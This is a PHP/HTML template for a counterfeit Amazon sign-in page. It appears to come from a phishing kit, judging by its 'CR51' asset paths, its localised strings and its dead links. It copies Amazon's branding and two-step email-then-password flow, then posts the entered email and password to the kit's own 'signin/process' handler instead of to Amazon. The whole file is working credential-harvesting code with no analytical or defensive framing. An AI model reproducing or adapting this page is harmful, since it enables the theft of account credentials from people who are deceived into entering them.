<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "CR51/language/lang.php";
?>
<!DOCTYPE html>
<html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.4-2021-08-16">

<head>
    <meta charset="utf-8">
    <title>
        <?php echo $_1 ?>
    </title>
    <link rel="shortcut icon" href="<?= base_url() ?>CR51/Assets/_hayo/images/favicon.ico" />
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/sign-dekstop.css">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.sign-desktop.css">
</head>

<body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate" cz-shortcut-listen="true">
    <div id="a-page">
        <div class="a-section a-padding-medium auth-workflow">
            <div class="a-section a-spacing-none auth-navbar">
                <div class="a-section a-spacing-medium a-text-center">
                    <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                </div>
            </div>
            <div id="authportal-center-section" class="a-section">
                <div class="a-section a-spacing-base auth-pagelet-container badInput hide">
                    <div class="a-section">
                        <div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" aria-live="assertive" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading"><?php echo $_2 ?></h4> <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                        <li><span class="a-list-item"> <?php echo $_3 ?> </span> </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="a-section auth-pagelet-container">
                    <div class="a-section a-spacing-base">
                        <div class="a-section">
                            <form name="signIn" method="post" action="<?= base_url() ?>signin/process" id="konzform" class="auth-validate-form auth-real-time-validation a-spacing-none" onsubmit="return checkpass();">
                                <div class="a-section">
                                    <div class="a-box" id="emailpage">
                                        <div class="a-box-inner a-padding-extra-large">
                                            <h1 class="a-spacing-small"> <?php echo $_4 ?> </h1>
                                            <div class="a-row a-spacing-base">
                                                <label for="ap_email" class="a-form-label">
                                                    <?php echo $_5 ?>
                                                </label>
                                                <input type="text" maxlength="128" id="ap_email" name="emailLogin" class="a-input-text a-span12 auth-autofocus auth-required-field formemail">
                                                <style>
                                                    .show {
                                                        display: block;
                                                    }
                                                </style>
                                                <div id="auth-email-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" aria-live="assertive" role="alert">
                                                    <div class="a-box-inner a-alert-container"> <i class="a-icon a-icon-alert"></i>
                                                        <div class="a-alert-content">
                                                            <?php echo $_6 ?>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="a-section"> <span id="continue" class="a-button a-button-span12 a-button-primary"> <span class="a-button-inner"> <input id="btnContinue" class="a-button-input" type="submit" onclick="return showPass();"> <span id="continue-announce" class="a-button-text" aria-hidden="true"><?php echo $_7 ?></span> </span>
                                                </span>
                                                <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
                                                    <?php echo $_8 ?>
                                                    <a href="#">
                                                        <?php echo $_9 ?>
                                                    </a>
                                                    <?php echo $_10 ?>
                                                    <a href="#">
                                                        <?php echo $_11 ?>
                                                    </a>.
                                                </div>
                                            </div>
                                            <div class="a-section">
                                                <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}" data-csa-c-id="hfxg3d-82z4jc-u21hge-jjzkib"><i class="a-icon a-icon-expand"></i><span class="a-expander-prompt">
                                                        <?php echo $_12 ?>
                                                    </span></a>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="a-box hide" id="passpage">
                                        <div class="a-box-inner a-padding-extra-large">
                                            <h1 class="a-spacing-small"> <?php echo $_4 ?> </h1>
                                            <div class="a-row a-spacing-base"> <span id="emailsgin"></span>
                                                <a id="ap_change_login_claim" class="a-link-normal" value="Refresh" onclick="history.go(0)">
                                                    <?php echo $_13 ?>
                                                </a>
                                            </div>
                                            <div class="a-section">
                                                <div class="a-section a-spacing-large">
                                                    <div class="a-row">
                                                        <div class="a-column a-span5">
                                                            <label for="ap_password" class="a-form-label">
                                                                <?php echo $_14 ?>
                                                            </label>
                                                        </div>
                                                        <div class="a-column a-span7 a-text-right a-span-last">
                                                            <a id="auth-fpp-link-bottoms" class="a-link-normal" tabindex="3" href="#">
                                                                <?php echo $_15 ?>
                                                            </a>
                                                        </div>
                                                    </div>
                                                    <input type="password" maxlength="1024" id="ap_password" name="passwordLogin" tabindex="2" class="a-input-text a-span12 auth-autofocus auth-required-field formpassword">
                                                    <div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini passnull" aria-live="assertive" role="alert">
                                                        <div class="a-box-inner a-alert-container"> <i class="a-icon a-icon-alert"></i>
                                                            <div class="a-alert-content">
                                                                <?php echo $_16 ?>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="a-section"> <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce"><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true"> <?php echo $_4 ?> </span></span>
                                                    </span>
                                                    <div class="a-row a-spacing-top-medium">
                                                        <div class="a-section a-text-left">
                                                            <label for="auth-remember-me" class="a-form-label">
                                                                <div data-a-input-name="rememberMe" class="a-checkbox">
                                                                    <label>
                                                                        <input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label"> <?php echo $_17 ?> <span class="a-declarative"> <a id="remember_me_learn_more_link" href="javascript:void(0)" class="a-popover-trigger a-declarative"> <?php echo $_18 ?> <i class="a-icon a-icon-popover"></i></a> </span> </span>
                                                                    </label>
                                                                </div>
                                                            </label>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="a-divider-sprite2" id="data-sprite">
                            <div class="a-divider a-divider-break">
                                <h5><?php echo $_19 ?></h5>
                            </div><span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" href="#" class="a-button-text" role="button"> <?php echo $_20 ?> </a></span></span>
                        </div>
                    </div>
                </div>
            </div>
            <div id="right-2"> </div>
            <div class="a-section a-spacing-top-extra-large auth-footer">
                <div class="a-divider a-divider-section">
                    <div class="a-divider-inner"></div>
                </div>
                <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal">
                        <?php echo $_21 ?>
                    </a> <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal">
                        <?php echo $_22 ?>
                    </a> <span class="auth-footer-seperator"></span>
                    <a class="a-link-normal">
                        <?php echo $_23 ?>
                    </a> <span class="auth-footer-seperator"></span>
                </div>
                <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
            </div>
        </div>
        <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery-3.3.1.min.js"></script>
        <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.validate.min.js"></script>
        <script>
            $(document).ready(function() {
                $("form").submit(function() {
                    $(this).submit(function() {
                        return false;
                    });
                    return true;
                });
            });
            $('input[name=emailLogin]').on('keyup', function() {
                $('#emailsgin').html($(this).val());
            });

            $('#ap_password').on('keyup', function(s) {
                if (13 == s.keyCode) $('#signInSubmit').click();
            });

            let showPass = () => {
                let ap_email = $('#ap_email').val();

                if (ap_email.length == '') {
                    $('.auth-inlined-error-message').addClass('show');
                    $('.formemail').addClass('a-form-error');
                    return true;
                } else if (!ap_email.match(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/)) {
                    $('.formemail').addClass('a-form-error');
                    $('.badInput').removeClass('hide');
                    return true;
                } else {
                    $('.formemail').removeClass('a-form-error');
                    $('.passnull').removeClass('show');
                    $('#btncontinue').addClass('hide');
                    $('.badInput').addClass('hide');
                    $('#emailpage').addClass('hide');
                    $('#data-sprite').addClass('hide');
                    $('#passpage').removeClass('hide');
                    return false;
                }
            }

            let checkpass = () => {
                let ap_password = $('#ap_password').val();

                if (ap_password.length < 6) {
                    $('.passnull').addClass('show');
                    $('.formpassword').addClass('show');
                    return false;
                } else {
                    $('.passnull').removeClass('show');
                    $('.formpassword').removeClass('show');
                }
            }
        </script>
</body>

</html>